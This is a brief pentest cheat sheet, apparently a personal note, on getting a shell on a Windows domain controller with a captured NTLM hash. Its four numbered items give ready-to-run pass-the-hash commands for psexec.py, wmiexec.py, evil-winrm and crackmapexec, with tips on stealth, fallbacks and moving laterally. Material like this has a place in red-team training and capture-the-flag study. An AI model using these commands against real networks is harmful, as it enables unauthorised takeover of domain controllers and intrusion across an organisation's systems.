
[[Evil-WinRM]]


Getting a Shell (or similar control)

1. Pass-the-Hash with psexec.py (Impacket)
   `psexec.py -hashes <LMHASH>:<NTHASH> 'DOMAIN/Administrator@DC_IP'`
   This often gives you a full shell on the DC.
   Use '' for LMHASH if it's empty.

2. SMBexec or WMIexec
   More stealthy or fallback if psexec.py fails.
   `wmiexec.py -hashes :<NTHASH> 'DOMAIN/Administrator@DC_IP'`
   These may provide limited shells, but still enough to move laterally or execute payloads.

3. Evil-WinRM (if WinRM is open)
   `evil-winrm -i DC_IP -u Administrator -H <NTHASH>`
   Check with nmap or crackmapexec if WinRM (5985/5986) is open.

4. Pass-the-Hash via crackmapexec
   `crackmapexec smb DC_IP -u Administrator -H <NTHASH> --exec-method smbexec -x "whoami"`
   Add --local-auth if it's not domain-joined or you're unsure.

